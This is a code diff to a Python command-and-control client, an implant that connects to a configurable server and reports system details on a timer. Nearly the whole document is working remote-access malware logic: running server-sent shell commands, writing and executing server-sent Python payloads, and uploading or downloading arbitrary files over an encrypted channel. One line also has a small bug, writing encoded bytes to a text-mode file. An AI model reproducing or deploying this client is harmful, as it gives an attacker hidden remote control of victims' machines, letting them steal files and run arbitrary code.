@@ -5,24 +5,37 @@ import time
 import subprocess
 import platform
 import logging
+from queue import Queue
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import serialization, hashes, hmac
 from cryptography.hazmat.primitives.asymmetric import padding
 import os
+import sys
+import base64
+import importlib.util
+import tempfile
+import uuid
 
 class C2Client:
-    def __init__(self, server_host='127.0.0.1', server_port=5000):
+    def __init__(self, server_host='127.0.0.1', server_port=5000, interval=5):
         self.server_host = server_host
         self.server_port = server_port
+        self.interval = interval
+        self.socket = None
+        self.connected = False
         self.symmetric_key = None
         self.hmac_key = None
         self.cipher_suite = None
-        self.socket = None
-        self.socket_lock = threading.Lock()  # New lock for socket operations
-        self.receive_thread = None
-        self.status_thread = None
-        self.stop_event = threading.Event()
+        self.executed_payloads = set()  # Keep track of executed payloads
+        self.command_queue = Queue()
+        self.socket_lock = threading.Lock()  # Lock for socket access
+        self.key_lock = threading.Lock()     # Lock for encryption keys
+        self.executed_payloads_lock = threading.Lock()  # Lock for executed_payloads set
         self.last_activity = time.time()
+        self.payloads_executed = {}  # Track executed payloads by ID
+        
+        # Ensure logs directory exists
+        os.makedirs('../logs', exist_ok=True)
         
         logging.basicConfig(
             level=logging.DEBUG,
@@ -33,9 +46,16 @@ class C2Client:
             ]
         )
         self.logger = logging.getLogger('C2Client')
+        self.logger.info("C2 Client initialized")
     
-    def connect_to_server(self):
-        self.stop_event.clear()
+    def connect(self):
+        """Connect to the C2 server and perform key exchange"""
+        self.logger.info(f"Attempting to connect to server at {self.server_host}:{self.server_port}")
+        self._connect()
+    
+    def _connect(self):
+        """Internal method to establish connection with server"""
+        self.connected = False
         
         try:
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -84,24 +104,28 @@ class C2Client:
             
             self.logger.info("Successful key exchange")
             
-            self.receive_thread = threading.Thread(
-                target=self.receive_commands, 
-                daemon=True
-            )
-            self.receive_thread.start()
+            self.connected = True
             
-            self.status_thread = threading.Thread(
-                target=self.send_system_status, 
-                daemon=True
-            )
-            self.status_thread.start()
+            # Start threads
+            command_thread = threading.Thread(target=self.receive_commands, daemon=True)
+            command_thread.start()
+            
+            status_thread = threading.Thread(target=self.send_system_status, daemon=True)
+            status_thread.start()
+            
+            process_thread = threading.Thread(target=self.process_command_queue, daemon=True)
+            process_thread.start()
+            
+            return True
         
         except Exception as e:
             self.logger.error(f"Connection error: {e}")
             self.cleanup()
+            return False
     
     def send_system_status(self):
-        while not self.stop_event.is_set():
+        """Periodically send system status to server"""
+        while self.connected:
             try:
                 status = {
                     'type': 'system_status',
@@ -109,12 +133,13 @@ class C2Client:
                     'system_info': self.get_system_info()
                 }
                 self.send_response(status)
-                self.stop_event.wait(60)
+                time.sleep(self.interval)
             except Exception as e:
                 self.logger.error(f"System status error: {e}")
                 time.sleep(5)
     
     def send_response(self, response):
+        """Send encrypted response to server"""
         try:
             with self.socket_lock:
                 if not self.socket:
@@ -138,10 +163,11 @@ class C2Client:
         except Exception as e:
             self.logger.error(f"Failed to send response: {e}")
             self.cleanup()
-            self.connect_to_server()
+            self._connect()
     
     def receive_commands(self):
-        while not self.stop_event.is_set():
+        """Main loop to receive and process commands from server"""
+        while self.connected:
             try:
                 with self.socket_lock:
                     if not self.socket:
@@ -191,10 +217,11 @@ class C2Client:
                 break
         
         self.cleanup()
-        self.connect_to_server()
+        self._connect()
     
     def cleanup(self):
-        self.stop_event.set()
+        """Clean up resources and close connections"""
+        self.connected = False
         with self.socket_lock:
             if self.socket:
                 try:
@@ -203,38 +230,96 @@ class C2Client:
                     pass
                 self.socket = None
     
+    def disconnect(self):
+        """Disconnect from the server"""
+        self.logger.info("Disconnecting from server")
+        self.cleanup()
+    
+    def process_command_queue(self):
+        """Process commands from the queue"""
+        while self.connected:
+            try:
+                # Get command from queue with a timeout to allow checking connected state
+                try:
+                    command = self.command_queue.get(timeout=1)
+                    self.process_command(command)
+                    self.command_queue.task_done()
+                except Exception as e:  # Using general Exception since Queue.Empty may not be accessible
+                    continue
+            except Exception as e:
+                self.logger.error(f"Error processing command queue: {e}")
+                time.sleep(1)
+    
     def process_command(self, command):
+        """Process incoming commands from the server"""
         try:
             command_type = command.get('type')
+            command_id = command.get('id', 'unknown')
+            
+            self.logger.debug(f"Processing command type: {command_type}, id: {command_id}")
             
             if command_type == 'heartbeat':
                 # Just log it if you want to track heartbeats
                 self.logger.debug("Heartbeat received from server")
                 return
             
-            if command_type == 'initial_payload':
+            if command_type == 'initial_payload' or command_type == 'payload':
                 try:
                     payload = command.get('payload')
+                    payload_id = command.get('payload_id', 'unknown')
+                    
+                    # Check if we've already executed this payload
+                    with self.executed_payloads_lock:
+                        if payload_id in self.executed_payloads:
+                            self.logger.info(f"Payload {payload_id} already executed, skipping")
+                            return
+                    
                     if payload:
-                        # Execute the payload in a separate thread to avoid blocking
-                        threading.Thread(
-                            target=self.execute_payload,
-                            args=(payload,),
-                            daemon=True
-                        ).start()
+                        # Execute the payload
+                        self.logger.info(f"Executing payload {payload_id}")
+                        result = self._execute_payload(payload)
+                        
+                        # Mark payload as executed
+                        with self.executed_payloads_lock:
+                            self.executed_payloads.add(payload_id)
+                        
+                        # Send result back to server
+                        response = {
+                            'type': 'payload_result',
+                            'payload_id': payload_id,
+                            'status': result.get('status', 'error'),
+                            'output': result.get('output', ''),
+                            'error': result.get('error', '')
+                        }
+                        self.send_response(response)
                 except Exception as e:
-                    self.logger.error(f"Failed to execute initial payload: {e}")
+                    self.logger.error(f"Failed to execute payload: {e}")
+                    response = {
+                        'type': 'payload_result',
+                        'payload_id': payload_id if 'payload_id' in locals() else 'unknown',
+                        'status': 'error',
+                        'error': str(e)
+                    }
+                    self.send_response(response)
                 return
             
             if command_type == 'shell':
+                cmd = command.get('cmd')
+                if not cmd:
+                    self.logger.warning("Shell command received with no 'cmd' field")
+                    return
+                
+                self.logger.info(f"Executing shell command: {cmd}")
                 result = subprocess.run(
-                    command['cmd'], 
+                    cmd, 
                     shell=True, 
                     capture_output=True, 
-                    text=True
+                    text=True,
+                    timeout=60  # 1-minute timeout
                 )
                 response = {
                     'type': 'shell_result',
+                    'id': command_id,
                     'stdout': result.stdout,
                     'stderr': result.stderr,
                     'returncode': result.returncode
@@ -242,7 +327,58 @@ class C2Client:
                 self.send_response(response)
             
             elif command_type == 'system_info':
-                self.send_response(self.get_system_info())
+                info = self.get_system_info()
+                info['type'] = 'system_info_result'
+                info['id'] = command_id
+                self.send_response(info)
+            
+            elif command_type == 'file_upload':
+                file_content = command.get('data')
+                file_path = command.get('path')
+                if file_content and file_path:
+                    try:
+                        # Make sure directory exists
+                        os.makedirs(os.path.dirname(file_path), exist_ok=True)
+                        # Decode base64 content
+                        file_bytes = base64.b64decode(file_content)
+                        with open(file_path, 'wb') as f:
+                            f.write(file_bytes)
+                        response = {
+                            'type': 'file_upload_result',
+                            'id': command_id,
+                            'status': 'success',
+                            'path': file_path
+                        }
+                    except Exception as e:
+                        response = {
+                            'type': 'file_upload_result',
+                            'id': command_id,
+                            'status': 'error',
+                            'error': str(e)
+                        }
+                    self.send_response(response)
+            
+            elif command_type == 'file_download':
+                file_path = command.get('path')
+                if file_path:
+                    try:
+                        with open(file_path, 'rb') as f:
+                            file_content = base64.b64encode(f.read()).decode()
+                        response = {
+                            'type': 'file_download_result',
+                            'id': command_id,
+                            'status': 'success',
+                            'path': file_path,
+                            'data': file_content
+                        }
+                    except Exception as e:
+                        response = {
+                            'type': 'file_download_result',
+                            'id': command_id,
+                            'status': 'error',
+                            'error': str(e)
+                        }
+                    self.send_response(response)
             
             else:
                 self.logger.warning(f"Unknown command type: {command_type}")
@@ -250,68 +386,82 @@ class C2Client:
         except Exception as e:
             self.logger.error(f"Command processing error: {e}")
     
-    def execute_payload(self, payload):
-        """Execute the initial payload in a safe manner"""
+    def _execute_payload(self, payload):
+        """Execute a payload and return the result"""
         try:
+            self.logger.debug("Creating temporary file for payload execution")
             # Create a temporary file to store the payload
-            import tempfile
-            import os
+            fd, path = tempfile.mkstemp(delete=False, suffix='.py')
             
-            with tempfile.NamedTemporaryFile(delete=False, suffix='.py') as temp_file:
-                temp_file.write(payload.encode())
-                temp_file_path = temp_file.name
+            with os.fdopen(fd, 'w') as f:
+                f.write(payload.encode())
             
             try:
+                self.logger.debug(f"Executing payload from {path}")
                 # Execute the payload
                 result = subprocess.run(
-                    ['python', temp_file_path],
+                    [sys.executable, path],
                     capture_output=True,
                     text=True,
                     timeout=300  # 5-minute timeout
                 )
                 
-                # Send the result back to the server
-                response = {
-                    'type': 'payload_result',
-                    'stdout': result.stdout,
-                    'stderr': result.stderr,
+                return {
+                    'status': 'success' if result.returncode == 0 else 'error',
+                    'output': result.stdout,
+                    'error': result.stderr,
                     'returncode': result.returncode
                 }
-                self.send_response(response)
             
             finally:
                 # Clean up the temporary file
                 try:
-                    os.unlink(temp_file_path)
-                except:
-                    pass
+                    os.unlink(path)
+                    self.logger.debug(f"Deleted temporary file {path}")
+                except Exception as e:
+                    self.logger.error(f"Failed to delete temporary file: {e}")
         
         except Exception as e:
             self.logger.error(f"Payload execution error: {e}")
-            response = {
-                'type': 'payload_result',
+            return {
+                'status': 'error',
                 'error': str(e)
             }
-            self.send_response(response)
     
     def get_system_info(self):
+        """Get system information"""
         return {
             'os': platform.system(),
             'release': platform.release(),
+            'version': platform.version(),
             'machine': platform.machine(),
             'processor': platform.processor(),
-            'hostname': platform.node()
+            'hostname': platform.node(),
+            'python_version': sys.version,
+            'uptime': time.time() - self.last_activity
         }
+        
+    def execute_payload(self, payload):
+        """Alias for _execute_payload to maintain compatibility with tests"""
+        return self._execute_payload(payload)
 
 def main():
-    client = C2Client()
-    client.connect_to_server()
+    import argparse
+    
+    parser = argparse.ArgumentParser(description='C2 Client')
+    parser.add_argument('--host', default='127.0.0.1', help='Server host')
+    parser.add_argument('--port', type=int, default=5000, help='Server port')
+    parser.add_argument('--interval', type=int, default=5, help='Status update interval in seconds')
+    args = parser.parse_args()
+    
+    client = C2Client(server_host=args.host, server_port=args.port, interval=args.interval)
+    client.connect()
     
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        client.cleanup()
+        client.disconnect()
 
 if __name__ == '__main__':
     main()
